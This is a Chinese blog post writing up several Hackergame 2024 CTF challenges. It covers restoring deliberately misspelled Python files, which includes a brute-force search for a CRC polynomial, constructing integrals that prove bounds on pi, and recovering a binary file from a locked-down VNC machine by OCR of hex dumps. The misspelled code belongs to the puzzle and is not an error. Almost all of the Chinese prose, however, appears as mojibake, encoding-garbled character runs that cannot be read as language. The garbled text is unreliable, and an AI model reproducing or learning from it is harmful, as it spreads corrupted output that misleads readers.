---
title: Hackergame 2024 é¢˜è§£ï¼ˆäºŒï¼‰
disableNunjucks: false
mathjax: true
id: 12168
date: 2024-11-09 13:10:26
categories: 
  - CTFé¢˜è§£
tags:
  - Hackergame
  - Hackergame 2024
cover: https://blogfiles.oss.fyz666.xyz/webp/0e71694e-9772-4998-aecb-3bb41267a079.webp
---

æœ¬æ–‡æ˜¯Hackergame 2024 é¢˜è§£çš„ç¬¬äºŒéƒ¨åˆ†ã€‚

## æƒœå­—å¦‚é‡‘ 3.0

{% hideToggle æŸ¥çœ‹é¢˜é¢ %}

{% note primary %}

æƒœå­—å¦‚é‡‘ä¸€å‘æ˜¯ç¨‹åºå¼€å‘çš„ä¼˜è‰¯ä¼ ç»Ÿã€‚æ— è®ºæ˜¯ã€Œ[creat](https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat)ã€è¿˜æ˜¯ã€Œ[referer](https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer)ã€ï¼Œéƒ½æ— ä¸é—ªè€€ç€ç¨‹åºå‘˜ã€ŒèŠ‚çº¦æ¯å¥è¯ä¸­çš„æ¯ä¸€ä¸ªå­—æ¯ã€çš„ä¼˜ç§€å“è´¨ã€‚ä¸¤å¹´å‰ï¼Œä¿¡æ¯å®‰å…¨å¤§èµ›ç»„å§”ä¼šæ­£å¼æ¨å‡ºäº†ã€Œæƒœå­—å¦‚é‡‘åŒ–ã€ï¼ˆXZRJificationï¼‰æ ‡å‡†è§„èŒƒï¼Œå—åˆ°äº†å¹¿å¤§ç¨‹åºå¼€å‘äººå‘˜çš„çƒ­çƒˆæ¬¢è¿å’Œä¸€è‡´å¥½è¯„ã€‚ç°å°†è¯¥æ ‡å‡†é‡æ–°è¾‘å½•å¦‚ä¸‹ã€‚

**æƒœå­—å¦‚é‡‘åŒ–æ ‡å‡†**
æƒœå­—å¦‚é‡‘åŒ–æŒ‡çš„æ˜¯å°†ä¸€ä¸²æ–‡æœ¬ä¸­çš„éƒ¨åˆ†å­—ç¬¦åˆ é™¤ï¼Œä»è€Œå½¢æˆå¦ä¸€ä¸²æ–‡æœ¬çš„è¿‡ç¨‹ã€‚è¯¥æ ‡å‡†é’ˆå¯¹çš„æ˜¯æ–‡æœ¬ä¸­æ‰€æœ‰ç”± 52 ä¸ªæ‹‰ä¸å­—æ¯è¿ç»­æ’å¸ƒå½¢æˆçš„åºåˆ—ï¼Œåœ¨ä¸‹æ–‡ä¸­ç»Ÿç§°ä¸ºã€Œå•è¯ã€ã€‚ä¸€ä¸ªå•è¯ä¸­é™¤ã€Œ`AEIOUaeiou`ã€å¤–çš„ 42 ä¸ªå­—æ¯è¢«ç§°ä½œã€Œè¾…éŸ³å­—æ¯ã€ã€‚æ•´ä¸ªæƒœå­—å¦‚é‡‘åŒ–çš„è¿‡ç¨‹æŒ‰ç…§ä»¥ä¸‹ä¸¤æ¡åŸåˆ™å¯¹æ–‡æœ¬ä¸­çš„æ¯ä¸ªå•è¯è¿›è¡Œæ“ä½œï¼š

- ç¬¬ä¸€åŸåˆ™ï¼ˆåˆç§° creat åŸåˆ™ï¼‰ï¼šå¦‚å•è¯æœ€åä¸€ä¸ªå­—æ¯ä¸ºã€Œ`e`ã€æˆ–ã€Œ`E`ã€ï¼Œä¸”è¯¥å­—æ¯çš„ä¸Šä¸€ä¸ªå­—æ¯ä¸ºè¾…éŸ³å­—æ¯ï¼Œåˆ™è¯¥å­—æ¯äºˆä»¥åˆ é™¤ã€‚
- ç¬¬äºŒåŸåˆ™ï¼ˆåˆç§° referer åŸåˆ™ï¼‰ï¼šå¦‚å•è¯ä¸­å­˜åœ¨ä¸€ä¸²å…¨éƒ¨ç”±å®Œå…¨ç›¸åŒï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰çš„è¾…éŸ³å­—æ¯ç»„æˆçš„å­ä¸²ï¼Œåˆ™è¯¥å­ä¸²ä»…ä¿ç•™ç¬¬ä¸€ä¸ªå­—æ¯ã€‚

å®¹æ˜“è¯æ˜æƒœå­—å¦‚é‡‘åŒ–æ“ä½œæ˜¯å¹‚ç­‰çš„ï¼šå¤šæ¬¡æƒœå­—å¦‚é‡‘åŒ–å’Œä¸€æ¬¡æƒœå­—å¦‚é‡‘åŒ–çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚

**ä½ çš„ä»»åŠ¡**
ä¸ºäº†æ‹¿åˆ°å¯¹åº”çš„ä¸‰ä¸ª flagï¼Œä½ éœ€è¦å°†ä¸‰ä¸ªã€Œæƒœå­—å¦‚é‡‘åŒ–ã€åçš„ Python æºä»£ç æ–‡æœ¬æ–‡ä»¶è¡¥å…¨ã€‚**æ‰€æœ‰æ–‡æœ¬æ–‡ä»¶åœ¨ã€Œæƒœå­—å¦‚é‡‘åŒ–ã€å‰å‡ä½¿ç”¨ç©ºæ ¼å°†æ¯è¡Œå¡«å……åˆ°äº† 80 ä¸ªå­—ç¬¦**ã€‚åå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡æœ¬æ–‡ä»¶é€è¡ŒåŒ¹é…ï¼Œå¦‚æœæ¯è¡Œå‡å’Œã€Œæƒœå­—å¦‚é‡‘åŒ–ã€å‰çš„æ–‡æœ¬æ–‡ä»¶å®Œå…¨ç›¸ç¬¦ï¼Œåˆ™è¾“å‡ºå¯¹åº” flagã€‚ä¸Šä¼ æ–‡ä»¶**æ— è®ºä½¿ç”¨ LF è¿˜æ˜¯ CRLF æ¢è¡Œï¼Œæ— è®ºæ˜¯å¦åœ¨å°¾éƒ¨å¢åŠ äº†å•ç‹¬çš„æ¢è¡Œç¬¦ï¼Œå‡å¯¹åŒ¹é…ç»“æœæ²¡æœ‰å½±å“ã€‚**

**é™„æ³¨**
æœ¬æ–‡å·²ç»è¿‡æƒœå­—å¦‚é‡‘åŒ–å¤„ç†ã€‚è§£ç­”æœ¬é¢˜ï¼ˆæ‹¿åˆ° flagï¼‰ä¸éœ€è¦ä»»ä½•å¾€å±Šæ¯”èµ›çš„ç›¸å…³çŸ¥è¯†ã€‚

---

XIZIRUJIN has always been a good tradition of programing. Whether it is "[creat](https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat)" or "[referer](https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer)", they al shin with th great virtu of a programer which saves every leter in every sentens. Th Hackergam Comitee launched th "XZRJification" standard about two years ago, which has been greatly welcomed and highly aclaimed by a wid rang of programers. Her w republish th standard as folows.

**XZRJification Standard**
XZRJification refers to th proces of deleting som characters in a text which forms another text. Th standard aims at al th continuous sequences of 52 Latin leters named as "word"s in a text. Th 42 leters in a word except "`AEIOUaeiou`" ar caled "consonant"s. Th XZRJification proces operates on each word in th text acording to th folowing two principles:

- Th first principl (also known as creat principl): If th last leter of th word is "`e`" or "`E`", and th previous leter of this leter is a consonant, th leter wil b deleted.
- Th second principl (also known as referer principl): If ther is a substring of th sam consonant (ignoring cas) in a word, only th first leter of th substring wil b reserved.
It is easy to prov that XZRJification is idempotent: th result of procesing XZRJification multipl times is exactly th sam as that of only onc.

**Your Task**
In order to get th three flags, you need to complet three python sourc cod files procesed through XZRJification. **Al th sourc cod files ar paded to 80 characters per lin with spaces befor XZRJification**. Th server backend wil match th uploaded text files lin by lin, and output th flag if each lin matches th coresponding lin in th sourc cod fil befor XZRJification. **Whether LF or CRLF is used, or whether an aditional lin break is aded at th end or not, ther wil b no efect on th matching results of uploaded files.**

**Notes**
This articl has been procesed through XZRJification. Any knowledg related to previous competitions is not required to get th answers (flags) of this chaleng.

[æœ¬é¢˜é™„ä»¶](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E6%83%9C%E5%AD%97%E5%A6%82%E9%87%91%203.0/files)

{% endnote %}

{% endhideToggle %}

ä¸‰ä¸ªé¢˜åˆ†åˆ«è¦æ±‚è¿˜åŸä¸‰ä¸ªæƒœå­—å¦‚é‡‘åŒ–å¤„ç†åçš„æ–‡ä»¶ã€‚

### é¢˜ç›® A

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, bas64, flask, itertools, os, r                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48 
    asert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A' 
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in rang(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in rang(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 els 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf                 
    asert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'litl')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return r.sub(pat, repl, input, flags=r.IGNORECAS)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__fil__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = bas64.b85encod(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.writ(row)                                                       
            paths.apend(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remov(path)                                                 
            except FileNotFoundEror:                                           
                pas                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_a', __nam__)                     
                                                                                
                                                                                
@bp.get('/answer_a.py')                                                         
def get() -> flask.Respons:                                                    
    return flask.Respons(xzrj_bytes, content_typ='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_a.py')                                                        
def post() -> flask.Respons:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerat(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is Non:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is Non:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = bas64.b85encod(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_a.txt', 'rb') as af:                                      
        answer_flag = bas64.b85decod(af.read()).decod()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        asert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                
```

é€åˆ†ï¼Œéšä¾¿ä¸€è¡¥å°±å¥½äº†ã€‚

### é¢˜ç›® B

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, bas64, flask, itertools, os, r                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'B', 48 
    asert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'B' 
    flip = sum(['b', 'B'].index(poly[i + 1]) << i for i in rang(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in rang(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 els 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xdbeEaed4cF43, 0xFDFECeBdeeD9, 0xB7E85A4E5Dcd                 
    asert (u2, u1, u0) == (241818181881667, 279270832074457, 202208575380941)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'litl')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return r.sub(pat, repl, input, flags=r.IGNORECAS)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__fil__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = bas64.b85encod(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.writ(row)                                                       
            paths.apend(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remov(path)                                                 
            except FileNotFoundEror:                                           
                pas                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_b', __nam__)                     
                                                                                
                                                                                
@bp.get('/answer_b.py')                                                         
def get() -> flask.Respons:                                                    
    return flask.Respons(xzrj_bytes, content_typ='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_b.py')                                                        
def post() -> flask.Respons:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerat(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is Non:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is Non:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = bas64.b85encod(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_b.txt', 'rb') as af:                                      
        answer_flag = bas64.b85decod(af.read()).decod()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        asert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                
```

è¦æˆ‘ä»¬è¡¥`crc`å‡½æ•°ä¸­çš„`poly`ï¼Œç›´æ¥ç©·ä¸¾çš„è¯æœ‰ 2 **47 = 140737488355328ä¸ªç»„åˆï¼Œè‚¯å®šè·‘ä¸å®Œã€‚

ä½†æˆ‘å‘ç°ï¼Œå¦‚æœä¿®æ”¹`poly`é åä½ç½®çš„å­—ç¬¦ï¼Œå¥½åƒå¯¹hashå€¼çš„å½±å“ä¸ä¼šå¤ªå¤§ï¼š

```python
print(hash('B' + 'B' * 47 + 'B', b'\xfe').hex())
for _ in range(20):
    print(hash('B' + 'B' * 15 + ''.join(random.choices('Bb', k=32)) + 'B', b'\xfe').hex())
```

äºæ˜¯æˆ‘å°±15ä½15ä½çš„çŒœï¼ˆç©·ä¸¾ 2 ** 15 = 32768 æ¬¡è¿˜æ˜¯å¯è¡Œçš„ï¼‰ã€‚

æœ€å¼€å§‹åŒ¹é…hashå€¼çš„å‰2ä¸ªå­—ç¬¦ï¼Œæ‰¾å‡ºæ‰€æœ‰å¯è¡Œçš„è§£ã€‚å­˜ä¸‹æ¥ä»¥åç»§ç»­çŒœä¸­é—´çš„15ä½ï¼Œï¼ˆç¬¬äºŒæ¬¡åŒ¹é…hashçš„å‰6ä¸ªå­—ç¬¦ï¼Œå¦‚æœæ‰¾å‡ºæ¥å¯è¡Œè§£å¤ªå¤šå°±å†å¤šå¢åŠ ä¸€ä½ï¼‰ï¼Œæœ€åå¾—å‡º128ä¸ªå¯è¡Œè§£ã€‚é€šè¿‡è¿™æœ€åçš„128ä¸ªå¯è¡Œè§£ï¼Œå»ç©·ä¸¾æœ€åçš„17ä¸ªå­—ç¬¦ï¼Œå¤§æ¦‚ç®—äº†3ã€4åˆ†é’Ÿå¾—åˆ°äº†æœ€ç»ˆç¬¦åˆæ¡ä»¶çš„`poly`ã€‚

è¿™é‡Œä»£ç å¤ªä¹±äº†å°±ä¸è´´å®Œæ•´ç‰ˆäº†ï¼ŒçŒœå‰15ä½çš„ä»£ç å¤§æ¦‚æ˜¯è¿™æ ·ï¼š

```python
s = b"\x01"
prefix = ['']
possible = []
for p in tqdm.tqdm(prefix):
    for comb in product('Bb', repeat=15):
        for _ in range(20):
            poly = 'B' + p + ''.join(comb) + 'B'
            h = hash(poly, s).hex()
            if not h.startswith('e3'):
                break
        else:
            possible.append(p + ''.join(comb))
```

### é¢˜ç›® C

Hashé‚£è¡Œæƒ³äº†ä¸€ä¸‹ï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆåŠæ³•å»è¡¥ï¼Œèµ›åçœ‹çœ‹é¢˜è§£æå‡ä¸€ä¸‹æ³¨æ„åŠ›ã€‚

## ä¼˜é›…çš„ä¸ç­‰å¼

{% hideToggle æŸ¥çœ‹é¢˜é¢ %}

{% note primary %}

> æ³¨æ„åˆ°
>  $ e^2-7=\int_0^1(1-x)^2\cdot 4x^2\cdot e^{2x}dx>0$

ä½ çš„æ•°å­¦åˆ†æåŠ©æ•™åˆåœ¨ç¾¤é‡Œå‘è¿™äº›å¥‡æ€ªçš„ä¸œè¥¿ï¼Œã€Œæ³¨æ„åŠ›æƒŠäººã€ï¼Œä½ éšæ‰‹åœ¨ç¾¤é‡Œåæ§½äº†ä¸€å¥ã€‚

ä¸è¿‡ï¼Œä¹Ÿè®¸å¯ä»¥é€šè¿‡æŠ€æœ¯æ‰‹æ®µå¼¥è¡¥ä½ æ¶£æ•£çš„æ³¨æ„åŠ›ã€‚

---

ä½ éœ€è¦ç”¨ä¼˜é›…çš„æ–¹å¼æ¥è¯æ˜ $\pi$ å¤§äºç­‰äºä¸€ä¸ªæœ‰ç†æ•° $p/q$ã€‚

å…·ä½“æ¥è¯´å°±æ˜¯åªä½¿ç”¨æ•´æ•°å’ŒåŠ å‡ä¹˜é™¤å¹‚è¿ç®—æ„é€ ä¸€ä¸ªç®€å•å‡½æ•°$f(x)$ï¼Œä½¿å¾—è¿™ä¸ªå‡½æ•°åœ¨$[0,1]$åŒºé—´ä¸Šå–å€¼å‡å¤§äºç­‰äº$0$ï¼Œå¹¶ä¸”$f(x)$åœ¨$[0,1]$åŒºé—´ä¸Šçš„å®šç§¯åˆ†ï¼ˆæ˜¾ç„¶å¤§äºç­‰äº$0$åˆšå¥½ç­‰äº$\pi-p/q$ã€‚

ç»™å®šé¢˜ç›®ï¼ˆè¯æ˜ $\pi\ge p/q$ï¼Œä½ æäº¤çš„è¯æ˜åªéœ€è¦åŒ…å«å‡½æ•°$f(x)$ã€‚

- è¦ä¼˜é›…ï¼šå‡½æ•°å­—ç¬¦ä¸²æœ‰é•¿åº¦é™åˆ¶ï¼Œ
- è¦æ˜¾ç„¶ï¼šSymPy èƒ½å¤Ÿå¿«é€Ÿè®¡ç®—è¿™ä¸ªå‡½æ•°çš„å®šç§¯åˆ†ï¼Œå¹¶éªŒè¯ $[0,1]$ã€‚

æ³¨ï¼šè§£å†³è¿™é“é¢˜ä¸éœ€è¦ä½¿ç”¨å•†ä¸šè½¯ä»¶ï¼Œåªä½¿ç”¨ SymPy ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚

[é¢˜ç›®æºä»£ç ](https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8D%E7%AD%89%E5%BC%8F/files/graceful_inequality.py)

{% endnote %}

{% endhideToggle %}

çŸ¥ä¹å¸¸é©»ç”¨æˆ·ç›´æ¥æ³¨æ„åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š[ã€ç§‘æ™®ã€‘å¦‚ä½•ä¼˜é›…åœ°â€œæ³¨æ„åˆ°â€å…³äºeã€Ï€çš„ä¸ç­‰å¼](https://zhuanlan.zhihu.com/p/669285539)

ç»“åˆè¿™é¢˜çš„ç«¯å£å·åŸºæœ¬å¯ä»¥ç¬ƒå®šè¿™å°±æ˜¯æœ€ç»ˆé¢„æœŸè§£æ³•äº†ã€‚

<img src="https://blogfiles.oss.fyz666.xyz/png/afa47871-5624-409a-b4fb-70e9e4f6692a.png" alt="image-20241109153321580" style="zoom:50%;" />

### Easy

$p=8, q=3$ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸æ¾çš„æ”¾ç¼©ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªç§¯åˆ†æ‰‹è§£å°±èƒ½ç®—å‡ºæ¥ï¼Œæˆ‘é‡‡ç”¨äº†ä¸‹é¢è¿™ä¸ªç§¯åˆ†ï¼š
$$
\int_0^1\frac{x^2(1-x)^2(a+bx+cx^2)}{1+x^2}dx
$$

æ ¹æ®å¯¹åº”çš„ç³»æ•°å¾—åˆ°æ–¹ç¨‹ç»„ï¼š

$$
\left\lbrace\begin{aligned}
&-\frac{b}{2}=1\\
&a-c=0\\
&-\frac{2}{3}a+\frac{19}{12}b+\frac{7}{10}c=-\frac{8}{3}
\end{aligned}\right.
$$

æ±‚å‡º$a,b,c$å³å¯ã€‚

### Hard

è¿™éƒ¨åˆ†åæœŸçš„ä¸ç­‰å¼ä¼šéå¸¸çš„ç´§ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„é•¿åº¦æœ‰é™åˆ¶ï¼Œæ•…å¿…é¡»è¶³å¤Ÿä¼˜é›…ã€‚æ³¨æ„åˆ°ä¸Šé¢é‚£ç¯‡çŸ¥ä¹åé¢è¿˜è®¨è®ºäº†â€œåˆ†æ¯å‡å¹‚æ‰©å¤§æ”¶æ•›åŠå¾„â€ï¼Œç»™äº†ä¸€ä¸ªæ–°çš„é“¾æ¥ï¼š[æ„é€ ç§¯åˆ†æ•°å€¼æ¯”è¾ƒçš„æ”¶æ•›æ€§](https://zhuanlan.zhihu.com/p/670472865)

ç‚¹è¿›è¿™ä¸ªé“¾æ¥ï¼Œä¸€ä¸ªè½¯ä»¶çš„æˆªå›¾å‡ºç°åœ¨å±å¹•ä¸Šï¼š

<img src="https://blogfiles.oss.fyz666.xyz/png/13531551-dd38-4177-9479-f439438b171e.png" alt="image-20241109154421963" style="zoom:50%;" />

å§æ§½ï¼Œç”šè‡³è¿˜æœ‰ä¸ª[åœ¨çº¿é“¾æ¥](https://aistudio.baidu.com/application/detail/39350)ã€‚

ç®€å•ç”¨äº†ä¸¤ä¸‹å‘ç°é€Ÿåº¦å¥‡å¿«ï¼Œå”¯ä¸€çš„é—®é¢˜åœ¨äºå®ƒçš„ç§¯åˆ†æ˜¯ä»1åˆ°æ­£æ— ç©·ï¼Œè¿™é‡Œåšä¸ªå˜é‡ä»£æ¢æŠŠç§¯åˆ†åŸŸæ¢åˆ°0åˆ°1ä¸Šå³å¯ã€‚

äºæ˜¯æˆ‘åœ¨è¿™Mathåˆ†ç±»é¢˜ä¸Šå†™äº†ä¸ªçˆ¬è™«ã€‚

ä»£ç å°±ä¸è´´äº†ã€‚

## æ— æ³•è·å¾—çš„ç§˜å¯†

{% hideToggle æŸ¥çœ‹é¢˜é¢ %}

{% note primary %}

å° A æœ‰ä¸€å°è¢«é‡é‡é™åˆ¶çš„è®¡ç®—æœºï¼Œä¸ä»…æ²¡æœ‰è”ç½‘ï¼Œè€Œä¸”ä½ åªèƒ½é€šè¿‡ VNC ä½¿ç”¨é”®é¼ è¾“å…¥ï¼Œçœ‹è§†é¢‘è¾“å‡ºã€‚ä¸Šé¢æœ‰ä¸ªç§˜å¯†æ–‡ä»¶ä½äº `/secret`ï¼Œä½ èƒ½å¸®ä»–æŠŠæ–‡ä»¶**ä¸æ¯«ä¸å·®**åœ°å¸¦å‡ºæ¥å—ï¼Ÿ

{% endnote %}

{% endhideToggle %}

æ˜¯ä¸ªVNCï¼Œä½†ç¦äº†å¾ˆå¤šæ“ä½œï¼Œæ¯”å¦‚å¤åˆ¶ç²˜è´´ï¼Œå¯¹é¢çš„ç”µè„‘ä¹Ÿä¸èƒ½è”ç½‘ã€‚

é¢˜ç›®è¦æ±‚æˆ‘ä»¬æŠŠ`/secret`è¿™ä¸ªæ–‡ä»¶å¸¦å‡ºæ¥ï¼Œ~~æ„Ÿè§‰ç”¨åˆ°èŒåœºä¸Šéå¸¸çš„åˆ‘~~ã€‚

è¿™é¢˜æˆ‘çš„åšæ³•éå¸¸è ¢ï¼Œç°åœ¨æƒ³èµ·æ¥çœŸæ˜¯å¤ªæœ‰æ¯…åŠ›äº†ï¼Œè¿˜å¾—æ˜¯å› ä¸ºæˆ‘å¿˜äº†åœ¨é˜²æ²‰è¿·é‚£ä¸ªæ™šä¸Šæå‰ä¸‹è½½å…¶ä»–é¢˜çš„é™„ä»¶ï¼Œä¸ç„¶æˆ‘ç»å¯¹ä¼šå†å»æƒ³ä¸€æƒ³åˆ«çš„æ–¹æ³•ã€‚

è®¤çœŸåšè¿‡è¿™é¢˜çš„åŒå­¦ï¼Œçœ‹åˆ°è¿™é‡Œåº”è¯¥å·²ç»çŒœåˆ°äº†ã€‚

æ²¡é”™ï¼Œæˆ‘æ˜¯ç”¨OCRåšçš„è¿™é“é¢˜ã€‚è¿™é“é¢˜èŠ±äº†æˆ‘å¤§çº¦6ä¸ªå°æ—¶ã€‚

---

å…ˆçœ‹äº†ä¸€ä¸‹`/secret`è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£ä¹ˆäºŒè¿›åˆ¶æ–‡ä»¶è¦æ€ä¹ˆé€šè¿‡æ‰‹æ‰“å‡ºæ¥å‘¢ï¼Ÿæˆ‘æƒ³åˆ°äº†ç”¨`xxd`å‘½ä»¤æŠŠå®ƒè½¬ä¸ºhexï¼Œæ¬¸ğŸ¤“ğŸ‘†è¿™ä¸å°±æ˜¯äººç±»å¯è¯»çš„æ–‡æœ¬äº†å˜›ã€‚

çœ‹äº†ä¸€ä¸‹è¿™ä¸ª`xxd`å¯¼å‡ºçš„æ–‡ä»¶æœ‰17ä¸‡è¡Œï¼Œä¼¼ä¹ä¸æ˜¯ç‰¹åˆ«å¤šï¼Œæˆ‘å¾ˆå¿«å°±å†™äº†è„šæœ¬æŠŠæ‰€æœ‰å†…å®¹æˆªå›¾å‡ºæ¥ä¿å­˜åœ¨æœ¬åœ°ï¼š

<img src="https://blogfiles.oss.fyz666.xyz/png/7c5c9c08-efa8-4209-b74e-15cafb39b756.png" alt="image-20241109155408747" style="zoom:50%;" />

ç„¶åå°±æ˜¯OCRäº†ï¼Œé—®é¢˜æ˜¯ä»€ä¹ˆOCRèƒ½å¤Ÿèƒœä»»è¿™ä¸ªä»»åŠ¡å‘¢ï¼Ÿ

æˆ‘åœ¨è¿™ä¸Šé¢å°è¯•äº†éå¸¸å¤šçš„å„ç±»OCRï¼Œæœ€åè·‘å»ç”³è¯·äº†1000æ¬¡å…è´¹çš„ç™¾åº¦OCRã€‚

è¯´å®è¯ç™¾åº¦OCRå‡†ç¡®ç‡çœŸçš„éå¸¸é«˜ï¼Œé«˜è¾¾99.999%ï¼ˆåšå®Œé¢˜ä»¥åå¾—å‡ºçš„ç»“è®ºï¼‰

ä½†å› ä¸ºè¿™æ–‡ä»¶æœ‰ä¸€ç™¾ä¸‡çš„å­—èŠ‚ï¼Œé«˜è¾¾99.999%çš„å‡†ç¡®ç‡ä¾ç„¶æœ‰10å‡ ä¸ªå­—ç¬¦æ˜¯è¯†åˆ«é”™è¯¯çš„ï¼Œè€Œä¸”å¤§å¤šæ˜¯æŠŠ9è¯†åˆ«0è¿™ç§é”™è¯¯ã€‚ä¸ºäº†æ‰¾è¿™10å‡ ä¸ªå­—ç¬¦ï¼Œæˆ‘å†™äº†ä¸€å †è„šæœ¬ç”¨äºŒåˆ†æ³•åšæ£€æµ‹ï¼ˆå³æŠŠæ–‡ä»¶äºŒåˆ†ï¼Œå¯¹æ¯”å·¦å³çš„hashå€¼å’ŒæœåŠ¡å™¨ä¸Šçš„æ˜¯å¦ä¸€è‡´ï¼Œæ¥ä¸€æ­¥ä¸€æ­¥ç¼©å°è¯†åˆ«é”™è¯¯çš„åŒºé—´ï¼Œå®šä½åˆ°æœ€ç»ˆçš„é‚£ä¸ªé”™è¯¯å­—ç¬¦ï¼‰

